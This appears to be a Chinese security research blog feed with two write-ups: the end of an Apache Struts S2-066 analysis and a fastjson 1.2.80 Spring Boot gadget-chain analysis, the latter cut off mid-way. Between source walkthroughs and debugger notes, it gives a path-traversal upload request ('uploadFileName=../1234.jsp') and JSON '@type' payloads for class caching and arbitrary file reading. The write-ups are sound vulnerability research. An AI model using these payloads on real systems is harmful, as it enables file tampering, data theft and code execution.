alt="img"></p><p>那么在<code>cn.ph0ebus.s2066.action.UploadAction#setUploadFileName</code>下断点看看调用堆栈</p><p>可以发现调用了<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>，<code>ParametersInterceptor</code>拦截器其主要功能是把<code>ActionContext</code>中的请求参数设置到<code>ValueStack</code>中，如果栈顶是当前Action则把请求参数设置到Action中，如果栈顶是一个model(Action实现了ModelDriven接口)则把参数设置到了model中。这里也就是用于设置<code>UploadAction</code>的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setParameters</span><span class="params">(Object action, ValueStack stack, HttpParameters parameters)</span> &#123;</span><br><span class="line">    HttpParameters params;</span><br><span class="line">    Map&lt;String, Parameter&gt; acceptableParameters;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ordered) &#123;</span><br><span class="line">        params = HttpParameters.create().withComparator(<span class="built_in">this</span>.getOrderedComparator()).withParent(parameters).build();</span><br><span class="line">        acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>(<span class="built_in">this</span>.getOrderedComparator());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        params = HttpParameters.create().withParent(parameters).build();</span><br><span class="line">        acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, Parameter&gt; entry : params.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterName</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isAcceptableParameter</span> <span class="operator">=</span> <span class="built_in">this</span>.isAcceptableParameter(parameterName, action);</span><br><span class="line">        isAcceptableParameter &amp;= <span class="built_in">this</span>.isAcceptableParameterValue((Parameter)entry.getValue(), action);</span><br><span class="line">        <span class="keyword">if</span> (isAcceptableParameter) &#123;</span><br><span class="line">            acceptableParameters.put(parameterName, entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ValueStack</span> <span class="variable">newStack</span> <span class="operator">=</span> <span class="built_in">this</span>.valueStackFactory.createValueStack(stack);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">clearableStack</span> <span class="operator">=</span> newStack <span class="keyword">instanceof</span> ClearableValueStack;</span><br><span class="line">    <span class="keyword">if</span> (clearableStack) &#123;</span><br><span class="line">        ((ClearableValueStack)newStack).clearContextValues();</span><br><span class="line">        Map&lt;String, Object&gt; context = newStack.getContext();</span><br><span class="line">        ReflectionContextState.setCreatingNullObjects(context, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setDenyMethodExecution(context, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setReportingConversionErrors(context, <span class="literal">true</span>);</span><br><span class="line">        newStack.getActionContext().withLocale(stack.getActionContext().getLocale()).withValueStack(stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">memberAccessStack</span> <span class="operator">=</span> newStack <span class="keyword">instanceof</span> MemberAccessValueStack;</span><br><span class="line">    <span class="keyword">if</span> (memberAccessStack) &#123;</span><br><span class="line">        <span class="type">MemberAccessValueStack</span> <span class="variable">accessValueStack</span> <span class="operator">=</span> (MemberAccessValueStack)newStack;</span><br><span class="line">        accessValueStack.useAcceptProperties(<span class="built_in">this</span>.acceptedPatterns.getAcceptedPatterns());</span><br><span class="line">        accessValueStack.useExcludeProperties(<span class="built_in">this</span>.excludedPatterns.getExcludedPatterns());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">        <span class="type">Parameter</span> <span class="variable">value</span> <span class="operator">=</span> (Parameter)entry.getValue();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            newStack.setParameter(name, value.getObject());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.devMode) &#123;</span><br><span class="line">                <span class="built_in">this</span>.notifyDeveloperParameterException(action, name, e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clearableStack) &#123;</span><br><span class="line">        stack.getActionContext().withConversionErrors(newStack.getActionContext().getConversionErrors());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.addParametersToContext(ActionContext.getContext(), acceptableParameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>acceptableParameters</code>是<code>TreeMap</code>的对象，默认根据key的自然顺序升序排序。这里key是String类型，则按照key值的字符逐个去进行比较判断的，并按照从小到大升序排序</p><p><a href="https://liaoxuefeng.com/books/java/collection/tree-map/index.html">https://liaoxuefeng.com/books/java/collection/tree-map/index.html</a></p><p><a href="https://codegym.cc/groups/posts/java-string-compareto-method">https://codegym.cc/groups/posts/java-string-compareto-method</a></p><p>于是最终放入<code>acceptableParameters</code>的参数键值对是有序的，而大小写会影响顺序，小写字符排序更后面。那么在调用<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>设置<code>UploadAction</code>的参数时，由于最终调用到 java bean 的 setter 方法，如果出现相同参数名首字母大小写都存在的情况，那么在设置参数值时都会调用到相同的 setter 方法。为什么呢，这里简单跟一下代码</p><p>根据刚刚给在<code>cn.ph0ebus.s2066.action.UploadAction#setUploadFileName</code>下断点时的堆栈信息中，可以分析出调用 java bean 的 setter 方法设置参数值的逻辑，可以给<code>ognl.OgnlRuntime#getSetMethod</code>下断点。</p><p>至于调用相同setter方法的具体逻辑在<code>ognl.OgnlRuntime#capitalizeBeanPropertyName</code>这里，规范化<code>propertyName</code>，也是根据java bean的getter和setter方法规范来的。很容易理解。例如当<code>propertyName</code>为abc和Abc，返回值均为Abc，最后获取到setAbc方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">capitalizeBeanPropertyName:2609, OgnlRuntime (ognl)</span><br><span class="line">getDeclaredMethods:2651, OgnlRuntime (ognl)</span><br><span class="line">_getSetMethod:2915, OgnlRuntime (ognl)</span><br><span class="line">getSetMethod:2884, OgnlRuntime (ognl)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">capitalizeBeanPropertyName</span><span class="params">(String propertyName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (propertyName.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName.toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;set&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;)&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;is&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">2</span>, <span class="number">3</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个时候<code>acceptableParameters</code>的键是<code>[File Name]</code>、<code>[File Name]ContentType</code>、<code>[File Name]FileName</code>。这里环境的file name为upload，根据前面的理论，如果此时上传数据包的<code>name</code>为Upload，那么也可以获取到相同的setter方法并调用赋值</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">hello ph0ebus</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/17/uX3WBJFt5HGZajA.png" alt="img"></p><p>那么此时如果<code>acceptableParameters</code>存在key为<code>uploadFileName</code>、值可控的元素，由于小写字母<code>u</code>比大写字母<code>U</code>排序更靠后，就可以再次调用<code>setUploadFileName</code>覆盖这里的值。<code>acceptableParameters</code>来源于<code>HttpParameters</code>，于是可以控制<code>HttpParameters</code>来控制<code>acceptableParameters</code>，而这就是HTTP数据包的参数</p><p>于是就可以构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action?uploadFileName=../1234.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p>GET传参，向<code>HttpParameters</code>增加了key为uploadFileName的元素，值也就是传入的参数值，可控</p><p><img src="https://s2.loli.net/2024/12/17/jYXFnKmzGcTWOEl.png" alt="img"></p><p>于是顺利进入到<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>寻找uploadFileName这个对应setter方法进行调用</p><p><img src="https://s2.loli.net/2024/12/17/a8i56znCEgWFYV1.png" alt="img"></p><p>对uploadFileName规范化为UploadFileName</p><p><img src="https://s2.loli.net/2024/12/17/daHiLrO54QDuocs.png" alt="img"></p><p>成功拿到<code>setUploadFileName</code>方法</p><p><img src="https://s2.loli.net/2024/12/17/7Fx2ic5uPXdzJVr.png" alt="img"></p><p>调用<code>setUploadFileName</code>方法覆盖上传的文件名</p><p><img src="https://s2.loli.net/2024/12/17/oNiZxS74V5Hd8IO.png" alt="img"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最近爆出来的s2-067看通告说和S2-066相似，于是先分析一下这个，还蛮有意思的，估计S2-067是基于这个的绕过吧</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> struts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson1.2.80 in Springtboot新链学习</title>
      <link href="/2024/12/12/fastjson1.2.80%20in%20Springtboot%E6%96%B0%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/12/12/fastjson1.2.80%20in%20Springtboot%E6%96%B0%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>首发于先知社区：<a href="https://xz.aliyun.com/t/16708">https://xz.aliyun.com/t/16708</a></p></blockquote><p><a href="https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf">https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf</a></p><p><a href="http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/">http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/</a></p><p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">GitHub - luelueking&#x2F;CVE-2022-25845-In-Spring: CVE-2022-25845(fastjson1.2.80) exploit in Spring Env!</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 <code>JSON.parse</code> 或 <code>JSON.parseObject</code> 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p><p><img src="https://s2.loli.net/2024/12/06/XhsNtREHD1KzVrp.webp"></p><p>在之前的研究中针对fj1.2.80已经有了三种常见的利用场景</p><p><a href="https://github.com/su18/hack-fastjson-1.2.80">GitHub - su18&#x2F;hack-fastjson-1.2.80</a></p><p><img src="https://s2.loli.net/2024/12/06/9lZtiaXscv7uyNq.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>需要的依赖</p><ul><li>jackson</li><li>commons-io</li></ul><p>思路</p><ol><li>将InputStream放入fastjson缓存</li><li>读取&#x2F;tmp文件下的文件，找到docbase的文件名。</li><li>往${docbase}&#x2F;WEB-INF&#x2F;classes&#x2F;路径下写入恶意类</li><li>通过fastjson触发类加载</li></ol><p><a href="https://github.com/ph0ebus/CVE-2022-25845-In-Spring">GitHub - ph0ebus&#x2F;CVE-2022-25845-In-Spring: exploit by python</a></p><p><img src="https://s2.loli.net/2024/12/06/1rDm25MnRZhdtNz.gif"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h2><p>这个新链子也是利用缓存机制</p><p><img src="https://s2.loli.net/2024/12/06/gM8i1WPFYkQfujG.png"></p><p><strong>fastjson反序列化符合条件的期望类时，会将setter参数、public字段、构造函数参数加到缓存中。</strong></p><p><img src="https://s2.loli.net/2024/12/06/TQzRw5kqKnNpM3W.png"></p><p>先分析一下添加缓存的过程，以下面payload为例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.fasterxml.jackson.core.exc.InputCoercionException&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/xHlC1AW4XiUVdzR.png"></p><p>在<code>TypeUtils.getClassFromMapping()</code>尝试从缓存中获取<code>java.lang.Exception</code>类</p><p><img src="https://s2.loli.net/2024/12/06/Hr6cygsBOCUnwM5.png"></p><p>在<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>初始化中默认添加了一些作为缓存了的类，其中就包含<code>Exception.class</code></p><p><img src="https://s2.loli.net/2024/12/06/nd2oNlJqp6Ajze8.png"></p><p>可以看到有95个缓存过的类</p><p><img src="https://s2.loli.net/2024/12/06/yxBqvgV1sp7TGOS.png"></p><p>从缓存中获取class后返回，然后继续恢复其字段信息</p><p><code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer</code>先通过获取到的class获取对应的反序列化器</p><p><img src="https://s2.loli.net/2024/12/06/T2lByerNkM6cW8Y.png"></p><p><img src="https://s2.loli.net/2024/12/06/cNfk6zqw3dyLC9i.png"></p><p>可以跟踪到这行关键代码</p><p><img src="https://s2.loli.net/2024/12/06/GjHWun9D54dt6PI.png"></p><p>根据异常处理类的继承关系可以发现，<code>java.lang.Exception</code>类符合这个判断条件，于是反序列化器被设置为<code>ThrowableDeserializer</code></p><p><img src="https://s2.loli.net/2024/12/06/XHfsk8andpSK3Ur.png"></p><p>在<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>反序列化过程中会将Exception作为期望类</p><p><img src="https://s2.loli.net/2024/12/06/dknOhKfNLwu3WQA.png"></p><p>然后解析json中的键值对，这里key是<code>@type</code></p><p><img src="https://s2.loli.net/2024/12/06/9Ny6nYQgdVkTKeb.png"></p><p>当key为<code>@type</code>时会将<code>Throwable.class</code>作为期望类传入<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType()</code></p><p><img src="https://s2.loli.net/2024/12/06/wXdqfV7c92KbDRl.png"></p><p><img src="https://s2.loli.net/2024/12/06/vwoXLx7cret2W9K.png"></p><p>需要经过黑名单过滤和白名单校验</p><p><img src="https://s2.loli.net/2024/12/06/TkJ2c3BC8besmRL.png"></p><p>继续跟进到这段代码，根据传入的Typename来加载类，加载后，如果是期望类的子类则加入到缓存mapping中</p><p><img src="https://s2.loli.net/2024/12/06/oHIThNAP8EXvugj.png"></p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>进一步分析一下任意读的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;    \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a.a&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonParser\&quot;,  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&quot;,  \&quot;in\&quot;: &#123;&#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.c.c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>利用循环引用尝试将字符串转换为对象并获取对象的值，按作者的话来说，这里是利用JsonPath来忽略本有的异常</p><p>接着上面继续分析，恢复好<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>后，继续利用<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>获取字段，根据key实例化出<code>FieldDeserializer</code>进一步处理</p><p><img src="https://s2.loli.net/2024/12/06/1mtdVkABFxUzuPE.png"></p><p>继续，调用<code>TypeUtils#cast</code>进行类型转换</p><p><img src="https://s2.loli.net/2024/12/06/2AmVsTXkhPcIag5.png"></p><p><code>com.alibaba.fastjson.util.TypeUtils#cast(java.lang.Object, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>会根据传入的obj进行相应的类型转换，这里会进入<code>Map</code>类型这个分支</p><p><img src="https://s2.loli.net/2024/12/06/1bdjB2WZv9KYMue.png"></p><p>跟进到<code>com.alibaba.fastjson.util.TypeUtils#castToJavaBean(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>，根据构造方法参数类型clazz获取反序列化器，clazz为<code>com.fasterxml.jackson.core.JsonParser</code></p><p><img src="https://s2.loli.net/2024/12/06/EsxcvjRPyHqXbmd.png"></p><p>获取到反序列化器后，调用<code>putDeserializer</code>函数<code>this.deserializers.put(type, deserializer)</code></p><p><img src="https://s2.loli.net/2024/12/06/869YZ2PbcfTDQxn.png"></p><p>这里就会将<code>type</code>和<code>deserializer</code>存入<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>中</p><p><img src="https://s2.loli.net/2024/12/06/wf7eKacL3WOUbvq.png"></p><p>在后续恢复<code>com.fasterxml.jackson.core.JsonParser</code>中，调用<code>this.deserializers.findClass(typeName)</code>就可以从<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>中获取到这个类</p><p><img src="https://s2.loli.net/2024/12/06/28W3JEz6vQjDeAI.png"></p><p><img src="https://s2.loli.net/2024/12/06/C7JuiNVTBd5RDxr.png"></p><p>而<code>com.fasterxml.jackson.core.json.UTF8StreamJsonParser</code>是<code>com.fasterxml.jackson.core.JsonParser</code>的子类，类似前面利用<code>java.lang.Exception</code>恢复<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>一样</p><p><img src="https://s2.loli.net/2024/12/06/YW4jfn9QCVzU6qH.png"></p><p>因为实现JsonParser的类中只有<code>UTF8StreamJsonParser</code>的构造参数存在<code>InputStream</code>，因此可以进一步获取到<code>InputStream</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UTF8StreamJsonParser</span><span class="params">(IOContext ctxt, <span class="type">int</span> features, InputStream in, ObjectCodec codec, ByteQuadsCanonicalizer sym, <span class="type">byte</span>[] inputBuffer, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> bytesPreProcessed, <span class="type">boolean</span> bufferRecyclable)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(ctxt, features);</span><br><span class="line">    <span class="built_in">this</span>._quadBuffer = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">this</span>._inputStream = in;</span><br><span class="line">    <span class="built_in">this</span>._objectCodec = codec;</span><br><span class="line">    <span class="built_in">this</span>._symbols = sym;</span><br><span class="line">    <span class="built_in">this</span>._inputBuffer = inputBuffer;</span><br><span class="line">    <span class="built_in">this</span>._inputPtr = start;</span><br><span class="line">    <span class="built_in">this</span>._inputEnd = end;</span><br><span class="line">    <span class="built_in">this</span>._currInputRowStart = start - bytesPreProcessed;</span><br><span class="line">    <span class="built_in">this</span>._currInputProcessed = (<span class="type">long</span>)(-start + bytesPreProcessed);</span><br><span class="line">    <span class="built_in">this</span>._bufferRecyclable = bufferRecyclable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/HR4eImwvabdiuNn.png"></p><p>而获取<code>InputStream</code>就是为了实现任意文件读</p><p><a href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">fastjson 读文件 gadget 的利用场景扩展</a></p><p>原blackhat usa 21的议题ppt</p><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p><p>这里就是通过<code>org.apache.commons.io.input.BOMInputStream</code>来逐字节盲读取文件</p><p><img src="https://s2.loli.net/2024/12/06/IvcKEtwdb4z8B5r.png"></p><p>在<code>org.apache.commons.io.input.BOMInputStream#getBOM</code>中会调用<code>org.apache.commons.io.input.BOMInputStream#find</code>方法</p><p><img 